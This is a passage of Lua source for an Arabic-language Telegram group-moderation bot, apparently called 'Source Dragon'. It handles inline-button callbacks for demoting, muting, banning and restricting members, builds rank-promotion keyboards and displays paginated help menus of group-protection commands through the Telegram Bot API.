tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:Constructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المنشئين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemBasicConstructor:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemBasicConstructor:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المنشئين الاساسيين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemAIANConstructor:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemAIANConstructor:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المالكين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemSudoBot:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemSudoBot:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:SudoBot:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المطورين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemSecondSudo:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemSecondSudo:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:SecondSudo:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المطورين الثانويين')
end,nil)
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':Mute:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':Mute:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
if RankChecking(dp.id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2,'⌯︙لا تستطيع كتم ↫ '..IdRank(dp.id_, data.chat_id_))
else
DevAIAN:sadd(WAAD..'AIAN:Muted:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم كتمه من المجموعه')
end
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':UnMute:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':UnMute:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:Muted:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم الغاء كتمه من المجموعه')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':Ban:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':Ban:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
if RankChecking(dp.id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2,'⌯︙لا تستطيع حظر ↫ '..IdRank(dp.id_, data.chat_id_))
else
DevAIAN:sadd(WAAD..'AIAN:Ban:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم حظره من المجموعه')
end
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':UnBan:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':UnBan:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:Ban:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم الغاء حظره من المجموعه')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':Tked:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':Tked:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
if RankChecking(dp.id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2,'⌯︙لا تستطيع تقيد ↫ '..IdRank(dp.id_, data.chat_id_))
else
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..data.chat_id_.."&user_id="..dp.id_)
DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تقيده من المجموعه')
end
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':UnTked:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':UnTked:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..data.chat_id_.."&user_id="..dp.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم الغاء تقيده من المجموعه')
end,nil)
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':SetRtba:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetRtba:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
if dp.first_name_ == false then
Dev_AIAN(data.chat_id_, data.id_, 1, "⌯︙الحساب محذوف", 1, "md")
return false  
end
local Text = ' ⌯︙قم باستعمال الازرار لرفع العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n✓'
keyboard = {} 
if Sudo(data) then
keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text="رفع مالك",callback_data=data.sender_user_id_..":SetAIANConstructor:"..AIANId},{text="رفع مطور",callback_data=data.sender_user_id_..":SetSudoBot:"..AIANId}},{{text="رفع مطور ثانوي",callback_data=data.sender_user_id_..":SetSecondSudo:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif SecondSudo(data) then
keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text="رفع مالك",callback_data=data.sender_user_id_..":SetAIANConstructor:"..AIANId},{text="رفع مطور",callback_data=data.sender_user_id_..":SetSudoBot:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif SudoBot(data) then
keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text="رفع مالك",callback_data=data.sender_user_id_..":SetAIANConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif AIANConstructor(data) then
keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif BasicConstructor(data) then
keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
end 
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':RemRtba:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemRtba:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
if dp.first_name_ == false then
Dev_AIAN(data.chat_id_, data.id_, 1, "⌯︙الحساب محذوف", 1, "md")
return false  
end
local Text = ' ⌯︙قم باستعمال الازرار لتنزيل العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n✓'
keyboard = {} 
if Sudo(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAIANConstructor:"..AIANId},{text="تنزيل مطور",callback_data=data.sender_user_id_..":RemSudoBot:"..AIANId}},{{text="تنزيل مطور ثانوي",callback_data=data.sender_user_id_..":RemSecondSudo:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif SecondSudo(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAIANConstructor:"..AIANId},{text="تنزيل مطور",callback_data=data.sender_user_id_..":RemSudoBot:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif SudoBot(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAIANConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif AIANConstructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif BasicConstructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
end 
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local S0FI = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "⌯︙الكلمه ↫ "..S0FI.." تم حذفها") 
DevAIAN:del(WAAD..'AIAN:Text:GpTexts'..S0FI..data.chat_id_)
DevAIAN:srem(WAAD..'AIAN:Manager:GpRedod'..data.chat_id_,S0FI)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local S0FI = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevAIAN:smembers(WAAD..'AIAN:Text:GpTexts'..S0FI..data.chat_id_)
if DevAIAN:get(WAAD..'AIAN:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌯︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..S0FI) 
DevAIAN:del(WAAD..'AIAN:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "⌯︙عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local S0FI = DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)')
if DevAIAN:get(WAAD..'AIAN:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌯︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..S0FI) 
DevAIAN:del(WAAD..'AIAN:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevAIAN:del(WAAD..'AIAN:Text:GpTexts'..S0FI..data.chat_id_)
DevAIAN:del(WAAD..'AIAN:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevAIAN:srem(WAAD..'AIAN:Manager:GpRedod'..data.chat_id_,S0FI)
else
EditMsg(Chat_Id2, Msg_Id2, "⌯︙عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/HideHelpList:(.*)') then
local S0FI = DataText:match('/HideHelpList:(.*)')
if tonumber(S0FI) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌯︙تم اخفاء كليشة الاوامر") 
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList:(.*)') then
local S0FI = DataText:match('/HelpList:(.*)')
if tonumber(S0FI) == tonumber(data.sender_user_id_) then
local Help = DevAIAN:get(WAAD..'AIAN:Help')
local Text = [[
⌯︙اهلا بك في قائمة الاوامر ↫ ⤈ 
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙م1 ↫ اوامر الحمايه
⌯︙م2 ↫ اوامر الادمنيه
⌯︙م3 ↫ اوامر المدراء
⌯︙م4 ↫ اوامر المنشئين
⌯︙م5 ↫ اوامر المطورين
⌯︙م6 ↫ اوامر الاعضاء
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList1:(.*)') then
local S0FI = DataText:match('/HelpList1:(.*)')
if tonumber(S0FI) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAIAN:get(WAAD..'AIAN:Help1')
local Text = [[
⌯︙اوامر حماية المجموعه ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙قفل • فتح ↫ الروابط
⌯︙قفل • فتح ↫ المعرفات
⌯︙قفل • فتح ↫ البوتات
⌯︙قفل • فتح ↫ المتحركه
⌯︙قفل • فتح ↫ الملصقات
⌯︙قفل • فتح ↫ الملفات
⌯︙قفل • فتح ↫ الصور
⌯︙قفل • فتح ↫ الفيديو
⌯︙قفل • فتح ↫ الاونلاين
⌯︙قفل • فتح ↫ الدردشه
⌯︙قفل • فتح ↫ التوجيه
⌯︙قفل • فتح ↫ الاغاني
⌯︙قفل • فتح ↫ الصوت
⌯︙قفل • فتح ↫ الجهات
⌯︙قفل • فتح ↫ الماركداون
⌯︙قفل • فتح ↫ التكرار
⌯︙قفل • فتح ↫ الهاشتاك
⌯︙قفل • فتح ↫ التعديل
⌯︙قفل • فتح ↫ التثبيت
⌯︙قفل • فتح ↫ الاشعارات
⌯︙قفل • فتح ↫ الكلايش
⌯︙قفل • فتح ↫ الدخول
⌯︙قفل • فتح ↫ الشبكات
⌯︙قفل • فتح ↫ المواقع
⌯︙قفل • فتح ↫ الفشار
⌯︙قفل • فتح ↫ الكفر
⌯︙قفل • فتح ↫ الطائفيه
⌯︙قفل • فتح ↫ الكل
⌯︙قفل • فتح ↫ العربيه
⌯︙قفل • فتح ↫ الانكليزيه
⌯︙قفل • فتح ↫ الفارسيه
⌯︙قفل • فتح ↫ التفليش
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙اوامر حمايه اخرى ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙قفل • فتح + الامر ↫ ⤈
⌯︙التكرار بالطرد
⌯︙التكرار بالكتم
⌯︙التكرار بالتقيد
⌯︙الفارسيه بالطرد
⌯︙البوتات بالطرد
⌯︙البوتات بالتقيد
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList2:(.*)') then
local S0FI = DataText:match('/HelpList2:(.*)')
if tonumber(S0FI) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAIAN:get(WAAD..'AIAN:Help2')
local Text = [[
⌯︙اوامر الادمنيه ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙الاعدادت
⌯︙تاك للكل 
⌯︙انشاء رابط
⌯︙ضع وصف
⌯︙ضع رابط
⌯︙ضع صوره
⌯︙حذف الرابط
⌯︙حذف المطايه
⌯︙كشف البوتات
⌯︙طرد البوتات
⌯︙تنظيف + العدد
⌯︙تنظيف التعديل
⌯︙كللهم + الكلمه
⌯︙اسم البوت + الامر
⌯︙ضع • حذف ↫ ترحيب
⌯︙ضع • حذف ↫ قوانين
⌯︙اضف • حذف ↫ صلاحيه
⌯︙الصلاحيات • حذف الصلاحيات
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙ضع سبام + العدد
⌯︙ضع تكرار + العدد
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙رفع مميز • تنزيل مميز
⌯︙المميزين • حذف المميزين
⌯︙كشف القيود • رفع القيود
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙حذف • مسح + بالرد
⌯︙منع • الغاء منع
⌯︙قائمه المنع
⌯︙حذف قائمه المنع
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تفعيل • تعطيل ↫ الرابط
⌯︙تفعيل • تعطيل ↫ الالعاب
⌯︙تفعيل • تعطيل ↫ الترحيب
⌯︙تفعيل • تعطيل ↫ التاك للكل
⌯︙تفعيل • تعطيل ↫ كشف الاعدادات
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙طرد المحذوفين
⌯︙طرد ↫ بالرد • بالمعرف • بالايدي
⌯︙كتم • الغاء كتم
⌯︙تقيد • الغاء تقيد
⌯︙حظر • الغاء حظر
⌯︙المكتومين • حذف المكتومين
⌯︙المقيدين • حذف المقيدين
⌯︙المحظورين • حذف المحظورين
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تقييد دقيقه + عدد الدقائق
⌯︙تقييد ساعه + عدد الساعات
⌯︙تقييد يوم + عدد الايام
⌯︙الغاء تقييد ↫ لالغاء التقييد بالوقت
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList3:(.*)') then
local S0FI = DataText:match('/HelpList3:(.*)')
if tonumber(S0FI) == tonumber(data.sender_user_id_) then
if not Admin(data) then
